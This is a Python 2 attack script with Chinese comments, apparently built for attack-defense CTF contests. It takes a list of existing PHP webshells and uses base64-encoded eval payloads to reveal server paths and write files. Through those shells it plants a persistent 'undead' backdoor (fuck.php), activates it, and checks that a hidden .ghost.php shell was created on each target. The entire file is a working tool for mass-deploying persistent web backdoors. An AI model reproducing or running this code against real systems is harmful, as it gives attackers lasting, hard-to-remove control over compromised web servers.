#!/usr/bin/python
#coding=utf-8

import sys,requests,base64,hashlib

#获取靶机的绝对路径
def getpath(url,method,passwd):
    data = {}
    if method == "get":
        data[passwd] = '@eval(base64_decode($_GET[z0]));'
        data['z0'] = 'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'
        res = requests.get(url,params=data)
        return res.content.strip()
    elif method == "post" :
        data['pass']='Sn3rtf4ck'
        data[passwd] = '@eval(base64_decode($_POST[z0]));'
        data['z0'] = 'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'
        res = requests.post(url,data=data)
        #print data
        return res.content.strip()
    else :
        return 0

#加载要上传的后门内容

def loadfile(filepath):
    try :
        file = open(filepath,"rb")
        return str(file.read())
    except :
        print "File %s Not Found!" %filepath
        sys.exit()

#写马函数
def cmd(url,method,passwd,web_path):
    #http://127.0.0.1:80/1110/x.php,post,x
    '''
    1.http or https
    2.端口要放在ip变量中
    3.Rfile  /1110/x.php
    '''
    try:
        url.index("http")
        #去除http://   ==> 127.0.0.1:80/1110/x.php
        urlstr=url[7:]
        lis = urlstr.split("/")
        ip=str(lis[0])
        Rfile = ""
        for i in range(1,len(lis)):
            Rfile = Rfile+"/"+str(lis[i])
    except :
        urlstr=url[8:]
        lis = urlstr.split("/")
        ip=str(lis[0])
        Rfile = ""
        for i in range(1,len(lis)):
            Rfile = Rfile+"/"+str(lis[i])
    #判断shell是否存在
    try :
        res = requests.get(url,timeout=10)
    except :
        print "[-] %s ERR_CONNECTION_TIMED_OUT" %url
        return 0
    if res.status_code!=200 :
        print "[-] %s Page Not Found!" %url
        return 0

    #加载要写入的内容
    shellPath = "auxi/shell.php"
    shell_content = loadfile(shellPath)

    #获取靶机的绝对路径
    # Rpath = getpath(url,method,passwd)#D:/phpStudy/WWW/1110/x.php
    # list0 = Rpath.split("/")
    # Rpath = ""
    # for i in range(0,(len(list0)-1)):
        # Rpath = Rpath+list0[i]+"/"
    data = {}
    #判断method
    if method =="post" :
        data['pass']=hashlib.md5(str(ip)+"you_can_not_guess_it!").hexdigest()
        data[passwd] = "@eval(base64_decode($_POST['z0']));"
        data['z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOyRjPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MiJdKTskYz1zdHJfcmVwbGFjZSgiXHIiLCIiLCRjKTskYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTskYnVmPSIiO2ZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTIpJGJ1Zi49c3Vic3RyKCRjLCRpLDIpO2VjaG8oQGZ3cml0ZShmb3BlbigkZiwndycpLCRidWYpPycxJzonMCcpOztlY2hvKCJYQFkiKTtkaWUoKTs='
        data['z1'] = base64.b64encode(web_path+"/fuck.php")
        data["z2"] = base64.b64encode(shell_content)
        #print data
        try:
            res = requests.post(url,data=data,proxies={"http":"127.0.0.1:8080"})
        except:
            print "[-] %s Shell has already been Deleted"%url
    elif method=="get" :
        data['pass']=hashlib.md5(str(ip)+"you_can_not_guess_it!").hexdigest()
        data[passwd] = "@eval(base64_decode($_GET['z0']));"
        data['z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JGY9YmFzZTY0X2RlY29kZSgkX0dFVFsiejEiXSk7JGM9YmFzZTY0X2RlY29kZSgkX0dFVFsiejIiXSk7JGM9c3RyX3JlcGxhY2UoIlxyIiwiIiwkYyk7JGM9c3RyX3JlcGxhY2UoIlxuIiwiIiwkYyk7JGJ1Zj0iIjtmb3IoJGk9MDskaTxzdHJsZW4oJGMpOyRpKz0yKSRidWYuPXN1YnN0cigkYywkaSwyKTtlY2hvKEBmd3JpdGUoZm9wZW4oJGYsJ3cnKSwkYnVmKT8nMSc6JzAnKTs7ZWNobygiWEBZIik7ZGllKCk7'
        data['z1'] = base64.b64encode(web_path+"/fuck.php")
        data["z2"] = base64.b64encode(shell_content)
        #在检测url是否存在的时候还存在，而上传文件的时候shell被删掉了。
        try:
            res = requests.post(url,params=data)
        except:
            print "[-] %s Shell has already been Deleted"%url
    else :
        print "method err!"
        sys.exit()

    #判断是否上传成功,失败直接跳过
    #print res.content
    if res.status_code!=200:
        print "[-] %s upload failed!" %ip
        return 0

    #激活不死马
    list=Rfile.split("/")
    b_url="http://"+ip
    max = len(list)-1
    for i in range(1,max):
        b_url=b_url+"/"+list[i]
    bsm_url = b_url+"/fuck.php"
    try :
        res = requests.post(bsm_url,data={"init":hashlib.md5(str(ip)+"you_can_not_guess_it!").hexdigest()},timeout=3)
    except Exception,e:
        # print e
        pass
    #尝试访问不死马生成的shell
    shell_url = b_url+"/.ghost.php"
    res = requests.get(shell_url)
    if res.status_code!=200 :
        print "[-] %s create shell failed!" %bsm_url
        return 0
    #输出shell地址
    print "[+] %s upload sucessed!" %shell_url

def upload():
    shellstr=loadfile("auxi/webshell.txt")
    l = shellstr.split("\n")
    #print str(list)
    i = 0
    url={}
    passwd={}
    method={}
    web_path = {}
    for data in l:
        if data:
            ls = data.split(",")
            method_tmp = str(ls[1])
            method_tmp = method_tmp.lower()
            if method_tmp=='post' or method_tmp=='get':
                url[i]=str(ls[0])
                method[i]=method_tmp
                passwd[i]=str(ls[2])
                web_path[i] = str(ls[3])
                i+=1
            else :
                print "[-] %s request method error!" %(str(ls[0]))
        else : pass
    for j in range(len(url)):
        cmd(url=url[j],method=method[j],passwd=passwd[j],web_path=web_path[j])